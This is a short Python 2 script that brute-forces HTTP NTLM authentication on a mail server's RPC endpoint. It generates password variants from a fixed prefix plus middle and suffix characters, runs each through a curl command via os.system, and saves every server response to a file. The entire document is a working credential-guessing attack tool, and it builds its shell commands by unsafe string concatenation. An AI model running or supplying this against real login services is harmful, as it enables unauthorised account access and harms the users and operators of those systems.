#!/usr/bin/env python2
#
# Python script to brute force HTTP NTLM Authentication
# The server response is saved in a .html file
#
# Copyright 2020 Marcos Azevedo (aka pylinux) : psylinux[at]gmail.com
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.

import os


pwdprefix  = "marcos"
pwdsmiddle = ['a', 's', 'd', 'A', 'S', 'D']
pwdsuffix  = ['1', '!', '#']
cmdprefix  = "curl -k -v --ntlm -u \"\mail.example.com\marcos:"
cmdsuffix  = "\" https://mail.example.com/rpc/"


for s in pwdsuffix:
    for m1 in pwdsmiddle:
        pwdattempt = pwdprefix + m1 + s
        print cmdprefix + pwdattempt + cmdsuffix + " -o " + pwdattempt + ".html"
        os.system(cmdprefix + pwdattempt + cmdsuffix + " -o " + pwdattempt + ".html")
